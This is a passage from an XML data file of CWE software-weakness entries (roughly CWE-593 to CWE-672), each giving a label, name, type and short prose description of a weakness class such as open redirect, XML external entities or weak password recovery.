  <description>The software modifies the SSL context after connection creation has begun.If the program modifies the SSL_CTX object after creating SSL objects from it, there is the possibility that older SSL objects created from the original context could all be affected by that change.</description>
</vulnerability>
<vulnerability label="CWE-594" name="J2EE Framework: Saving Unserializable Objects to Disk" type="Variant" reference="CWE">
  <description>When the J2EE container attempts to write unserializable objects to disk there is no guarantee that the process will complete successfully.</description>
</vulnerability>
<vulnerability label="CWE-595" name="Comparison of Object References Instead of Object Contents" type="Base" reference="CWE">
  <description>The program compares object references instead of the contents of the objects themselves, preventing it from detecting equivalent objects.</description>
</vulnerability>
<vulnerability label="CWE-596" name="Incorrect Semantic Object Comparison" type="Base" reference="CWE">
  <description>The software does not correctly compare two objects based on their conceptual content.</description>
</vulnerability>
<vulnerability label="CWE-597" name="Use of Wrong Operator in String Comparison" type="Variant" reference="CWE">
  <description>The product uses the wrong operator when comparing a string, such as using &quot;==&quot; when the equals() method should be used instead.In Java, using == or != to compare two strings for equality actually compares two objects for equality, not their values. Chances are good that the two references will never be equal. While this weakness often only affects program correctness, if the equality is used for a security decision, it could be leveraged to affect program security.</description>
</vulnerability>
<vulnerability label="CWE-598" name="Information Exposure Through Query Strings in GET Request" type="Variant" reference="CWE">
  <description>The web application uses the GET method to process requests that contain sensitive information, which can expose that information through the browser's history, Referers, web logs, and other sources.</description>
</vulnerability>
<vulnerability label="CWE-599" name="Trust of OpenSSL Certificate Without Validation" type="Variant" reference="CWE">
  <description>The software uses an OpenSSL Certificate without validating the certificate data.This could allow an attacker to claim to be a trusted host.</description>
</vulnerability>
<vulnerability label="CWE-6" name="J2EE Misconfiguration: Insufficient Session-ID Length" type="Variant" reference="CWE">
  <description>The J2EE application is configured to use an insufficient session ID length.If an attacker can guess or steal a session ID, then he/she may be able to take over the user's session (called session hijacking). The number of possible session IDs increases with increased session ID length, making it more difficult to guess or steal a session ID.</description>
</vulnerability>
<vulnerability label="CWE-600" name="Uncaught Exception in Servlet " type="Base" reference="CWE">
  <description>The Servlet does not catch all exceptions, which may reveal sensitive debugging information.When a Servlet throws an exception, the default error response the Servlet container sends back to the user typically includes debugging information. This information is of great value to an attacker. For example, a stack trace might show the attacker a malformed SQL query string, the type of database being used, and the version of the application container. This information enables the attacker to target known vulnerabilities in these components.</description>
</vulnerability>
<vulnerability label="CWE-601" name="URL Redirection to Untrusted Site ('Open Redirect')" type="Variant" reference="CWE">
  <description>A web application accepts a user-controlled input that specifies a link to an external site, and uses that link in a Redirect. This simplifies phishing attacks.An http parameter may contain a URL value and could cause the web application to redirect the request to the specified URL. By modifying the URL value to a malicious site, an attacker may successfully launch a phishing scam and steal user credentials. Because the server name in the modified link is identical to the original site, phishing attempts have a more trustworthy appearance.</description>
</vulnerability>
<vulnerability label="CWE-602" name="Client-Side Enforcement of Server-Side Security" type="Base" reference="CWE">
  <description>The software is composed of a server that relies on the client to implement a mechanism that is intended to protect the server.When the server relies on protection mechanisms placed on the client side, an attacker can modify the client-side behavior to bypass the protection mechanisms resulting in potentially unexpected interactions between the client and server. The consequences will vary, depending on what the mechanisms are trying to protect.</description>
</vulnerability>
<vulnerability label="CWE-603" name="Use of Client-Side Authentication" type="Base" reference="CWE">
  <description>A client/server product performs authentication within client code but not in server code, allowing server-side authentication to be bypassed via a modified client that omits the authentication check.Client-side authentication is extremely weak and may be breached easily. Any attacker may read the source code and reverse-engineer the authentication mechanism to access parts of the application which would otherwise be protected.</description>
</vulnerability>
<vulnerability label="CWE-605" name="Multiple Binds to the Same Port" type="Base" reference="CWE">
  <description>When multiple sockets are allowed to bind to the same port, other services on that port may be stolen or spoofed.</description>
</vulnerability>
<vulnerability label="CWE-606" name="Unchecked Input for Loop Condition" type="Base" reference="CWE">
  <description>The product does not properly check inputs that are used for loop conditions, potentially leading to a denial of service because of excessive looping.</description>
</vulnerability>
<vulnerability label="CWE-607" name="Public Static Final Field References Mutable Object" type="Variant" reference="CWE">
  <description>A public or protected static final field references a mutable object, which allows the object to be changed by malicious code, or accidentally from another package.</description>
</vulnerability>
<vulnerability label="CWE-608" name="Struts: Non-private Field in ActionForm Class" type="Variant" reference="CWE">
  <description>An ActionForm class contains a field that has not been declared private, which can be accessed without using a setter or getter.</description>
</vulnerability>
<vulnerability label="CWE-609" name="Double-Checked Locking" type="Base" reference="CWE">
  <description>The program uses double-checked locking to access a resource without the overhead of explicit synchronization, but the locking is insufficient.Double-checked locking refers to the situation where a programmer checks to see if a resource has been initialized, grabs a lock, checks again to see if the resource has been initialized, and then performs the initialization if it has not occurred yet. This should not be done, as is not guaranteed to work in all languages and on all architectures. In summary, other threads may not be operating inside the synchronous block and are not guaranteed to see the operations execute in the same order as they would appear inside the synchronous block.</description>
</vulnerability>
<vulnerability label="CWE-610" name="Externally Controlled Reference to a Resource in Another Sphere" type="Class" reference="CWE">
  <description>The product uses an externally controlled name or reference that resolves to a resource that is outside of the intended control sphere.</description>
</vulnerability>
<vulnerability label="CWE-611" name="Information Exposure Through XML External Entity Reference" type="Variant" reference="CWE">
  <description>The product processes an XML document that can contain XML entities with URLs that resolve to documents outside of the intended sphere of control, causing the product to embed incorrect documents into its output.XML documents optionally contain a Document Type Definition (DTD), which, among other features, enables the definition of &quot;XML entities&quot;. It is possible to define an entity locally by providing a substitution string in the form of a URL whose content is substituted for the XML entity when the DTD is processed. The attack can be launched by defining an XML entity whose content is a file URL (which, when processed by the receiving end, is mapped into a file on the server), that is embedded in the XML document, and thus, is fed to the processing application. This application may echo back the data (e.g. in an error message), thereby exposing the file contents.</description>
</vulnerability>
<vulnerability label="CWE-612" name="Information Exposure Through Indexing of Private Data" type="Variant" reference="CWE">
  <description>The product performs an indexing routine against private documents, but does not sufficiently verify that the actors who can access the index also have the privileges to access the private documents.When an indexing routine is applied against a group of private documents, and that index's results are available to outsiders who do not have access to those documents, then outsiders might be able to obtain sensitive information by conducting targeted searches. The risk is especially dangerous if search results include surrounding text that was not part of the search query. This issue can appear in search engines that are not configured (or implemented) to ignore critical files that should remain hidden; even without permissions to download these files directly, the remote user could read them.</description>
</vulnerability>
<vulnerability label="CWE-613" name="Insufficient Session Expiration" type="Base" reference="CWE">
  <description>According to WASC, &quot;Insufficient Session Expiration is when a web site permits an attacker to reuse old session credentials or session IDs for authorization.&quot;</description>
</vulnerability>
<vulnerability label="CWE-614" name="Sensitive Cookie in HTTPS Session Without 'Secure' Attribute" type="Variant" reference="CWE">
  <description>The Secure attribute for sensitive cookies in HTTPS sessions is not set, which could cause the user agent to send those cookies in plaintext over an HTTP session.</description>
</vulnerability>
<vulnerability label="CWE-615" name="Information Exposure Through Comments" type="Variant" reference="CWE">
  <description>While adding general comments is very useful, some programmers tend to leave important data, such as: filenames related to the web application, old links or links which were not meant to be browsed by users, old code fragments, etc.An attacker who finds these comments can map the application's structure and files, expose hidden parts of the site, and study the fragments of code to reverse engineer the application, which may help develop further attacks against the site.</description>
</vulnerability>
<vulnerability label="CWE-616" name="Incomplete Identification of Uploaded File Variables (PHP)" type="Variant" reference="CWE">
  <description>The PHP application uses an old method for processing uploaded files by referencing the four global variables that are set for each file (e.g. $varname, $varname_size, $varname_name, $varname_type). These variables could be overwritten by attackers, causing the application to process unauthorized files.These global variables could be overwritten by POST requests, cookies, or other methods of populating or overwriting these variables. This could be used to read or process arbitrary files by providing values such as &quot;/etc/passwd&quot;.</description>
</vulnerability>
<vulnerability label="CWE-617" name="Reachable Assertion" type="Variant" reference="CWE">
  <description>The product contains an assert() or similar statement that can be triggered by an attacker, which leads to an application exit or other behavior that is more severe than necessary.For example, if a server handles multiple simultaneous connections, and an assert() occurs in one single connection that causes all other connections to be dropped, this is a reachable assertion that leads to a denial of service.</description>
</vulnerability>
<vulnerability label="CWE-618" name="Exposed Unsafe ActiveX Method" type="Base" reference="CWE">
  <description>An ActiveX control is intended for use in a web browser, but it exposes dangerous methods that perform actions that are outside of the browser's security model (e.g. the zone or domain).ActiveX controls can exercise far greater control over the operating system than typical Java or javascript. Exposed methods can be subject to various vulnerabilities, depending on the implemented behaviors of those methods, and whether input validation is performed on the provided arguments. If there is no integrity checking or origin validation, this method could be invoked by attackers.</description>
</vulnerability>
<vulnerability label="CWE-619" name="Dangling Database Cursor ('Cursor Injection')" type="Base" reference="CWE">
  <description>If a database cursor is not closed properly, then it could become accessible to other users while retaining the same privileges that were originally assigned, leaving the cursor &quot;dangling.&quot;For example, an improper dangling cursor could arise from unhandled exceptions. The impact of the issue depends on the cursor's role, but SQL injection attacks are commonly possible.</description>
</vulnerability>
<vulnerability label="CWE-62" name="UNIX Hard Link" type="Variant" reference="CWE">
  <description>The software, when opening a file or directory, does not sufficiently account for when the name is associated with a hard link to a target that is outside of the intended control sphere. This could allow an attacker to cause the software to operate on unauthorized files.Failure for a system to check for hard links can result in vulnerability to different types of attacks. For example, an attacker can escalate their privileges if a file used by a privileged program is replaced with a hard link to a sensitive file (e.g. /etc/passwd). When the process opens the file, the attacker can assume the privileges of that process.</description>
</vulnerability>
<vulnerability label="CWE-620" name="Unverified Password Change" type="Variant" reference="CWE">
  <description>When setting a new password for a user, the product does not require knowledge of the original password, or using another form of authentication.This could be used by an attacker to change passwords for another user, thus gaining the privileges associated with that user.</description>
</vulnerability>
<vulnerability label="CWE-621" name="Variable Extraction Error" type="Base" reference="CWE">
  <description>The product uses external input to determine the names of variables into which information is extracted, without verifying that the names of the specified variables are valid. This could cause the program to overwrite unintended variables.For example, in PHP, calling extract() or import_request_variables() without the proper arguments could allow arbitrary global variables to be overwritten, including superglobals. Similar functionality might be possible in other interpreted languages, including custom languages.</description>
</vulnerability>
<vulnerability label="CWE-622" name="Unvalidated Function Hook Arguments" type="Variant" reference="CWE">
  <description>A product adds hooks to user-accessible API functions, but does not properly validate the arguments. This could lead to resultant vulnerabilities.Such hooks can be used in defensive software that runs with privileges, such as anti-virus or firewall, which hooks kernel calls. When the arguments are not validated, they could be used to bypass the protection scheme or attack the product itself.</description>
</vulnerability>
<vulnerability label="CWE-623" name="Unsafe ActiveX Control Marked Safe For Scripting" type="Variant" reference="CWE">
  <description>An ActiveX control is intended for restricted use, but it has been marked as safe-for-scripting.This might allow attackers to use dangerous functionality via a web page that accesses the control, which can lead to different resultant vulnerabilities, depending on the control's behavior.</description>
</vulnerability>
<vulnerability label="CWE-624" name="Executable Regular Expression Error" type="Base" reference="CWE">
  <description>The product uses a regular expression that either (1) contains an executable component with user-controlled inputs, or (2) allows a user to enable execution by inserting pattern modifiers.Case (2) is possible in the PHP preg_replace() function, and possibly in other languages when a user-controlled input is inserted into a string that is later parsed as a regular expression.</description>
</vulnerability>
<vulnerability label="CWE-625" name="Permissive Regular Expression" type="Base" reference="CWE">
  <description>The product uses a regular expression that does not sufficiently restrict the set of allowed values.This effectively causes the regexp to accept substrings that match the pattern, which produces a partial comparison to the target. In some cases, this can lead to other weaknesses. Common errors include:not identifying the beginning and end of the target stringusing wildcards instead of acceptable character rangesothers</description>
</vulnerability>
<vulnerability label="CWE-626" name="Null Byte Interaction Error (Poison Null Byte)" type="Variant" reference="CWE">
  <description>The product does not properly handle null bytes or NUL characters when passing data between different representations or components.A null byte (NUL character) can have different meanings across representations or languages. For example, it is a string terminator in standard C libraries, but Perl and PHP strings do not treat it as a terminator. When two representations are crossed - such as when Perl or PHP invokes underlying C functionality - this can produce an interaction error with unexpected results. Similar issues have been reported for ASP. Other interpreters written in C might also be affected.</description>
</vulnerability>
<vulnerability label="CWE-627" name="Dynamic Variable Evaluation" type="Base" reference="CWE">
  <description>In a language where the user can influence the name of a variable at runtime, if the variable names are not controlled, an attacker can read or write to arbitrary variables, or access arbitrary functions.The resultant vulnerabilities depend on the behavior of the application, both at the crossover point and in any control/data flow that is reachable by the related variables or functions.</description>
</vulnerability>
<vulnerability label="CWE-628" name="Function Call with Incorrectly Specified Arguments" type="Base" reference="CWE">
  <description>The product calls a function, procedure, or routine with arguments that are not correctly specified, leading to always-incorrect behavior and resultant weaknesses.There are multiple ways in which this weakness can be introduced, including:the wrong variable or reference;an incorrect number of arguments;incorrect order of arguments;wrong type of arguments; orwrong value.</description>
</vulnerability>
<vulnerability label="CWE-636" name="Not Failing Securely ('Failing Open')" type="Class" reference="CWE">
  <description>When the product encounters an error condition or failure, its design requires it to fall back to a state that is less secure than other options that are available, such as selecting the weakest encryption algorithm or using the most permissive access control restrictions.By entering a less secure state, the product inherits the weaknesses associated with that state, making it easier to compromise. At the least, it causes administrators to have a false sense of security. This weakness typically occurs as a result of wanting to &quot;fail functional&quot; to minimize administration and support costs, instead of &quot;failing safe.&quot;</description>
</vulnerability>
<vulnerability label="CWE-637" name="Unnecessary Complexity in Protection Mechanism (Not Using 'Economy of Mechanism')" type="Class" reference="CWE">
  <description>The software uses a more complex mechanism than necessary, which could lead to resultant weaknesses when the mechanism is not correctly understood, modeled, configured, implemented, or used.Security mechanisms should be as simple as possible. Complex security mechanisms may engender partial implementations and compatibility problems, with resulting mismatches in assumptions and implemented security. A corollary of this principle is that data specifications should be as simple as possible, because complex data specifications result in complex validation code. Complex tasks and systems may also need to be guarded by complex security checks, so simple systems should be preferred.</description>
</vulnerability>
<vulnerability label="CWE-638" name="Not Using Complete Mediation" type="Class" reference="CWE">
  <description>The software does not perform access checks on a resource every time the resource is accessed by an entity, which can create resultant weaknesses if that entity's rights or privileges change over time.</description>
</vulnerability>
<vulnerability label="CWE-639" name="Authorization Bypass Through User-Controlled Key" type="Base" reference="CWE">
  <description>The system's authorization functionality does not prevent one user from gaining access to another user's data or record by modifying the key value identifying the data.Retrieval of a user record occurs in the system based on some key value that is under user control. The key would typically identify a user related record stored in the system and would be used to lookup that record for presentation to the user. It is likely that an attacker would have to be an authenticated user in the system. However, the authorization process would not properly check the data access operation to ensure that the authenticated user performing the operation has sufficient entitlements to perform the requested data access, hence bypassing any other authorization checks present in the system. One manifestation of this weakness would be if a system used sequential or otherwise easily guessable session ids that would allow one user to easily switch to another user's session and read/modify their data.</description>
</vulnerability>
<vulnerability label="CWE-64" name="Windows Shortcut Following (.LNK)" type="Variant" reference="CWE">
  <description>The software, when opening a file or directory, does not sufficiently handle when the file is a Windows shortcut (.LNK) whose target is outside of the intended control sphere. This could allow an attacker to cause the software to operate on unauthorized files.The shortcut (file with the .lnk extension) can permit an attacker to read/write a file that they originally did not have permissions to access.</description>
</vulnerability>
<vulnerability label="CWE-640" name="Weak Password Recovery Mechanism for Forgotten Password" type="Base" reference="CWE">
  <description>The software contains a mechanism for users to recover or change their passwords without knowing the original password, but the mechanism is weak.It is common for an application to have a mechanism that provides a means for a user to gain access to their account in the event they forget their password. Very often the password recovery mechanism is weak, which has the effect of making it more likely that it would be possible for a person other than the legitimate system user to gain access to that user's account.This weakness may be that the security question is too easy to guess or find an answer to (e.g. because it is too common). Or there might be an implementation weakness in the password recovery mechanism code that may for instance trick the system into e-mailing the new password to an e-mail account other than that of the user. There might be no throttling done on the rate of password resets so that a legitimate user can be denied service by an attacker if an attacker tries to recover their password in a rapid succession. The system may send the original password to the user rather than generating a new temporary password. In summary, password recovery functionality, if not carefully designed and implemented can often become the system's weakest link that can be misused in a way that would allow an attacker to gain unauthorized access to the system. Weak password recovery schemes completely undermine a strong password authentication scheme.</description>
</vulnerability>
<vulnerability label="CWE-641" name="Improper Restriction of Names for Files and Other Resources" type="Base" reference="CWE">
  <description>The application constructs the name of a file or other resource using input from an upstream component, but does not restrict or incorrectly restricts the resulting name.This may produce resultant weaknesses. For instance, if the names of these resources contain scripting characters, it is possible that a script may get executed in the client's browser if the application ever displays the name of the resource on a dynamically generated web page. Alternately, if the resources are consumed by some application parser, a specially crafted name can exploit some vulnerability internal to the parser, potentially resulting in execution of arbitrary code on the server machine. The problems will vary based on the context of usage of such malformed resource names and whether vulnerabilities are present in or assumptions are made by the targeted technology that would make code execution possible.</description>
</vulnerability>
<vulnerability label="CWE-642" name="External Control of Critical State Data" type="Class" reference="CWE">
  <description>The software stores security-critical state information about its users, or the software itself, in a location that is accessible to unauthorized actors.If an attacker can modify the state information without detection, then it could be used to perform unauthorized actions or access unexpected resources, since the application programmer does not expect that the state can be changed.State information can be stored in various locations such as a cookie, in a hidden web form field, input parameter or argument, an environment variable, a database record, within a settings file, etc. All of these locations have the potential to be modified by an attacker. When this state information is used to control security or determine resource usage, then it may create a vulnerability. For example, an application may perform authentication, then save the state in an &quot;authenticated=true&quot; cookie. An attacker may simply create this cookie in order to bypass the authentication.</description>
</vulnerability>
<vulnerability label="CWE-643" name="Improper Neutralization of Data within XPath Expressions ('XPath Injection')" type="Base" reference="CWE">
  <description>The software uses external input to dynamically construct an XPath expression used to retrieve data from an XML database, but it does not neutralize or incorrectly neutralizes that input. This allows an attacker to control the structure of the query.The net effect is that the attacker will have control over the information selected from the XML database and may use that ability to control application flow, modify logic, retrieve unauthorized data, or bypass important checks (e.g. authentication).</description>
</vulnerability>
<vulnerability label="CWE-644" name="Improper Neutralization of HTTP Headers for Scripting Syntax" type="Variant" reference="CWE">
  <description>The application does not neutralize or incorrectly neutralizes web scripting syntax in HTTP headers that can be used by web browser components that can process raw headers, such as Flash.An attacker may be able to conduct cross-site scripting and other attacks against users who have these components enabled.If an application does not neutralize user controlled data being placed in the header of an HTTP response coming from the server, the header may contain a script that will get executed in the client's browser context, potentially resulting in a cross site scripting vulnerability or possibly an HTTP response splitting attack. It is important to carefully control data that is being placed both in HTTP response header and in the HTTP response body to ensure that no scripting syntax is present, taking various encodings into account.</description>
</vulnerability>
<vulnerability label="CWE-645" name="Overly Restrictive Account Lockout Mechanism" type="Base" reference="CWE">
  <description>The software contains an account lockout protection mechanism, but the mechanism is too restrictive and can be triggered too easily. This allows attackers to deny service to legitimate users by causing their accounts to be locked out.Account lockout is a security feature often present in applications as a countermeasure to the brute force attack on the password based authentication mechanism of the system. After a certain number of failed login attempts, the users' account may be disabled for a certain period of time or until it is unlocked by an administrator. Other security events may also possibly trigger account lockout. However, an attacker may use this very security feature to deny service to legitimate system users. It is therefore important to ensure that the account lockout security mechanism is not overly restrictive.</description>
</vulnerability>
<vulnerability label="CWE-646" name="Reliance on File Name or Extension of Externally-Supplied File" type="Variant" reference="CWE">
  <description>The software allows a file to be uploaded, but it relies on the file name or extension of the file to determine the appropriate behaviors. This could be used by attackers to cause the file to be misclassified and processed in a dangerous fashion.An application might use the file name or extension of of a user-supplied file to determine the proper course of action, such as selecting the correct process to which control should be passed, deciding what data should be made available, or what resources should be allocated. If the attacker can cause the code to misclassify the supplied file, then the wrong action could occur. For example, an attacker could supply a file that ends in a &quot;.php.gif&quot; extension that appears to be a GIF image, but would be processed as PHP code. In extreme cases, code execution is possible, but the attacker could also cause exhaustion of resources, denial of service, exposure of debug or system data (including application source code), or being bound to a particular server side process. This weakness may be due to a vulnerability in any of the technologies used by the web and application servers, due to misconfiguration, or resultant from another flaw in the application itself.</description>
</vulnerability>
<vulnerability label="CWE-647" name="Use of Non-Canonical URL Paths for Authorization Decisions" type="Variant" reference="CWE">
  <description>The software defines policy namespaces and makes authorization decisions based on the assumption that a URL is canonical. This can allow a non-canonical URL to bypass the authorization.If an application defines policy namespaces and makes authorization decisions based on the URL, but it does not require or convert to a canonical URL before making the authorization decision, then it opens the application to attack. For example, if the application only wants to allow access to http://www.example.com/mypage, then the attacker might be able to bypass this restriction using equivalent URLs such as:http://WWW.EXAMPLE.COM/mypagehttp://www.example.com/%6Dypage (alternate encoding)http://192.168.1.1/mypage (IP address)http://www.example.com/mypage/ (trailing /)http://www.example.com:80/mypageTherefore it is important to specify access control policy that is based on the path information in some canonical form with all alternate encodings rejected (which can be accomplished by a default deny rule).</description>
</vulnerability>
<vulnerability label="CWE-648" name="Incorrect Use of Privileged APIs" type="Base" reference="CWE">
  <description>The application does not conform to the API requirements for a function call that requires extra privileges. This could allow attackers to gain privileges by causing the function to be called incorrectly.When an application contains certain functions that perform operations requiring an elevated level of privilege, the caller of a privileged API must be careful to:ensure that assumptions made by the APIs are valid, such as validity of argumentsaccount for known weaknesses in the design/implementation of the APIcall the API from a safe contextIf the caller of the API does not follow these requirements, then it may allow a malicious user or process to elevate their privilege, hijack the process, or steal sensitive data.For instance, it is important to know if privileged APIs do not shed their privileges before returning to the caller or if the privileged function might make certain assumptions about the data, context or state information passed to it by the caller. It is important to always know when and how privileged APIs can be called in order to ensure that their elevated level of privilege cannot be exploited.</description>
</vulnerability>
<vulnerability label="CWE-649" name="Reliance on Obfuscation or Encryption of Security-Relevant Inputs without Integrity Checking" type="Base" reference="CWE">
  <description>The software uses obfuscation or encryption of inputs that should not be mutable by an external actor, but the software does not use integrity checks to detect if those inputs have been modified.When an application relies on obfuscation or incorrectly applied / weak encryption to protect client-controllable tokens or parameters, that may have an effect on the user state, system state, or some decision made on the server. Without protecting the tokens/parameters for integrity, the application is vulnerable to an attack where an adversary blindly traverses the space of possible values of the said token/parameter in order to attempt to gain an advantage. The goal of the attacker is to find another admissible value that will somehow elevate his or her privileges in the system, disclose information or change the behavior of the system in some way beneficial to the attacker. If the application does not protect these critical tokens/parameters for integrity, it will not be able to determine that these values have been tampered with. Measures that are used to protect data for confidentiality should not be relied upon to provide the integrity service.</description>
</vulnerability>
<vulnerability label="CWE-65" name="Windows Hard Link" type="Variant" reference="CWE">
  <description>The software, when opening a file or directory, does not sufficiently handle when the name is associated with a hard link to a target that is outside of the intended control sphere. This could allow an attacker to cause the software to operate on unauthorized files.Failure for a system to check for hard links can result in vulnerability to different types of attacks. For example, an attacker can escalate their privileges if a file used by a privileged program is replaced with a hard link to a sensitive file (e.g. AUTOEXEC.BAT). When the process opens the file, the attacker can assume the privileges of that process, or prevent the program from accurately processing data.</description>
</vulnerability>
<vulnerability label="CWE-650" name="Trusting HTTP Permission Methods on the Server Side" type="Variant" reference="CWE">
  <description>The server contains a protection mechanism that assumes that any URI that is accessed using HTTP GET will not cause a state change to the associated resource. This might allow attackers to bypass intended access restrictions and conduct resource modification and deletion attacks, since some applications allow GET to modify state.An application may disallow the HTTP requests to perform DELETE, PUT and POST operations on the resource representation, believing that it will be enough to prevent unintended resource alterations. Even though the HTTP GET specification requires that GET requests should not have side effects, there is nothing in the HTTP protocol itself that prevents the HTTP GET method from performing more than just query of the data. For instance, it is a common practice with REST based Web Services to have HTTP GET requests modifying resources on the server side. Whenever that happens however, the access control needs to be properly enforced in the application. No assumptions should be made that only HTTP DELETE, PUT, and POST methods have the power to alter the representation of the resource being accessed in the request.</description>
</vulnerability>
<vulnerability label="CWE-651" name="Information Exposure Through WSDL File" type="Variant" reference="CWE">
  <description>The Web services architecture may require exposing a WSDL file that contains information on the publicly accessible services and how callers of these services should interact with them (e.g. what parameters they expect and what types they return).An information exposure may occur if any of the following apply:The WSDL file is accessible to a wider audience than intended.The WSDL file contains information on the methods/services that should not be publicly accessible or information about deprecated methods. This problem is made more likely due to the WSDL often being automatically generated from the code.Information in the WSDL file helps guess names/locations of methods/resources that should not be publicly accessible.</description>
</vulnerability>
<vulnerability label="CWE-652" name="Improper Neutralization of Data within XQuery Expressions ('XQuery Injection')" type="Base" reference="CWE">
  <description>The software uses external input to dynamically construct an XQuery expression used to retrieve data from an XML database, but it does not neutralize or incorrectly neutralizes that input. This allows an attacker to control the structure of the query.The net effect is that the attacker will have control over the information selected from the XML database and may use that ability to control application flow, modify logic, retrieve unauthorized data, or bypass important checks (e.g. authentication).</description>
</vulnerability>
<vulnerability label="CWE-653" name="Insufficient Compartmentalization" type="Base" reference="CWE">
  <description>The product does not sufficiently compartmentalize functionality or processes that require different privilege levels, rights, or permissions.When a weakness occurs in functionality that is accessible by lower-privileged users, then without strong boundaries, an attack might extend the scope of the damage to higher-privileged users.</description>
</vulnerability>
<vulnerability label="CWE-654" name="Reliance on a Single Factor in a Security Decision" type="Base" reference="CWE">
  <description>A protection mechanism relies exclusively, or to a large extent, on the evaluation of a single condition or the integrity of a single object or entity in order to make a decision about granting access to restricted resources or functionality.</description>
</vulnerability>
<vulnerability label="CWE-655" name="Insufficient Psychological Acceptability" type="Base" reference="CWE">
  <description>The software has a protection mechanism that is too difficult or inconvenient to use, encouraging non-malicious users to disable or bypass the mechanism, whether by accident or on purpose.</description>
</vulnerability>
<vulnerability label="CWE-656" name="Reliance on Security Through Obscurity" type="Base" reference="CWE">
  <description>The software uses a protection mechanism whose strength depends heavily on its obscurity, such that knowledge of its algorithms or key data is sufficient to defeat the mechanism.This reliance on &quot;security through obscurity&quot; can produce resultant weaknesses if an attacker is able to reverse engineer the inner workings of the mechanism. Note that obscurity can be one small part of defense in depth, since it can create more work for an attacker; however, it is a significant risk if used as the primary means of protection.</description>
</vulnerability>
<vulnerability label="CWE-657" name="Violation of Secure Design Principles" type="Class" reference="CWE">
  <description>The product violates well-established principles for secure design.This can introduce resultant weaknesses or make it easier for developers to introduce related weaknesses during implementation. Because code is centered around design, it can be resource-intensive to fix design problems.</description>
</vulnerability>
<vulnerability label="CWE-66" name="Improper Handling of File Names that Identify Virtual Resources" type="Base" reference="CWE">
  <description>The product does not handle or incorrectly handles a file name that identifies a &quot;virtual&quot; resource that is not directly specified within the directory that is associated with the file name, causing the product to perform file-based operations on a resource that is not a file.Virtual file names are represented like normal file names, but they are effectively aliases for other resources that do not behave like normal files. Depending on their functionality, they could be alternate entities. They are not necessarily listed in directories.</description>
</vulnerability>
<vulnerability label="CWE-662" name="Improper Synchronization" type="Base" reference="CWE">
  <description>The software attempts to use a shared resource in an exclusive manner, but does not prevent or incorrectly prevents use of the resource by another thread or process.</description>
</vulnerability>
<vulnerability label="CWE-663" name="Use of a Non-reentrant Function in a Concurrent Context" type="Base" reference="CWE">
  <description>The software calls a non-reentrant function in a concurrent context in which a competing code sequence (e.g. thread or signal handler) may have an opportunity to call the same function or otherwise influence its state.</description>
</vulnerability>
<vulnerability label="CWE-664" name="Improper Control of a Resource Through its Lifetime" type="Class" reference="CWE">
  <description>The software does not maintain or incorrectly maintains control over a resource throughout its lifetime of creation, use, and release.Resources often have explicit instructions on how to be created, used and destroyed. When software does not follow these instructions, it can lead to unexpected behaviors and potentially exploitable states.Even without explicit instructions, various principles are expected to be adhered to, such as &quot;Do not use an object until after its creation is complete,&quot; or &quot;do not use an object after it has been slated for destruction.&quot;</description>
</vulnerability>
<vulnerability label="CWE-665" name="Improper Initialization" type="Base" reference="CWE">
  <description>The software does not initialize or incorrectly initializes a resource, which might leave the resource in an unexpected state when it is accessed or used.This can have security implications when the associated resource is expected to have certain properties or values, such as a variable that determines whether a user has been authenticated or not.</description>
</vulnerability>
<vulnerability label="CWE-666" name="Operation on Resource in Wrong Phase of Lifetime" type="Base" reference="CWE">
  <description>The software performs an operation on a resource at the wrong phase of the resource's lifecycle, which can lead to unexpected behaviors.When a developer wants to initialize, use or release a resource, it is important to follow the specifications outlined for how to operate on that resource and to ensure that the resource is in the expected state. In this case, the software wants to perform a normally valid operation, initialization, use or release, on a resource when it is in the incorrect phase of its lifetime.</description>
</vulnerability>
<vulnerability label="CWE-667" name="Improper Locking" type="Base" reference="CWE">
  <description>The software does not properly acquire a lock on a resource, or it does not properly release a lock on a resource, leading to unexpected resource state changes and behaviors.</description>
</vulnerability>
<vulnerability label="CWE-668" name="Exposure of Resource to Wrong Sphere" type="Class" reference="CWE">
  <description>The product exposes a resource to the wrong control sphere, providing unintended actors with inappropriate access to the resource.Resources such as files and directories may be inadvertently exposed through mechanisms such as insecure permissions, or when a program accidentally operates on the wrong object. For example, a program may intend that private files can only be provided to a specific user. This effectively defines a control sphere that is intended to prevent attackers from accessing these private files. If the file permissions are insecure, then parties other than the user will be able to access those files.A separate control sphere might effectively require that the user can only access the private files, but not any other files on the system. If the program does not ensure that the user is only requesting private files, then the user might be able to access other files on the system.In either case, the end result is that a resource has been exposed to the wrong party.</description>
</vulnerability>
<vulnerability label="CWE-669" name="Incorrect Resource Transfer Between Spheres" type="Class" reference="CWE">
  <description>The product does not properly transfer a resource/behavior to another sphere, or improperly imports a resource/behavior from another sphere, in a manner that provides unintended control over that resource.</description>
</vulnerability>
<vulnerability label="CWE-67" name="Improper Handling of Windows Device Names" type="Variant" reference="CWE">
  <description>The software constructs pathnames from user input, but it does not handle or incorrectly handles a pathname containing a Windows device name such as AUX or CON. This typically leads to denial of service or an information exposure when the application attempts to process the pathname as a regular file.Not properly handling virtual filenames (e.g. AUX, CON, PRN, COM1, LPT1) can result in different types of vulnerabilities. In some cases an attacker can request a device via injection of a virtual filename in a URL, which may cause an error that leads to a denial of service or an error page that reveals sensitive information. A software system that allows device names to bypass filtering runs the risk of an attacker injecting malicious code in a file with the name of a device.</description>
</vulnerability>
<vulnerability label="CWE-670" name="Always-Incorrect Control Flow Implementation" type="Class" reference="CWE">
  <description>The code contains a control flow path that does not reflect the algorithm that the path is intended to implement, leading to incorrect behavior any time this path is navigated.This weakness captures cases in which a particular code segment is always incorrect with respect to the algorithm that it is implementing. For example, if a C programmer intends to include multiple statements in a single block but does not include the enclosing braces (CWE-483), then the logic is always incorrect. This issue is in contrast to most weaknesses in which the code usually behaves correctly, except when it is externally manipulated in malicious ways.</description>
</vulnerability>
<vulnerability label="CWE-671" name="Lack of Administrator Control over Security" type="Class" reference="CWE">
  <description>The product uses security features in a way that prevents the product's administrator from tailoring security settings to reflect the environment in which the product is being used. This introduces resultant weaknesses or prevents it from operating at a level of security that is desired by the administrator.If the product's administrator does not have the ability to manage security-related decisions at all times, then protecting the product from outside threats - including the product's developer - can become impossible. For example, a hard-coded account name and password cannot be changed by the administrator, thus exposing that product to attacks that the administrator can not prevent.</description>
</vulnerability>
<vulnerability label="CWE-672" name="Operation on a Resource after Expiration or Release" type="Base" reference="CWE">
  <description>The software uses, accesses, or otherwise operates on a resource after that resource has been expired, released, or revoked.</description>
</vulnerability>
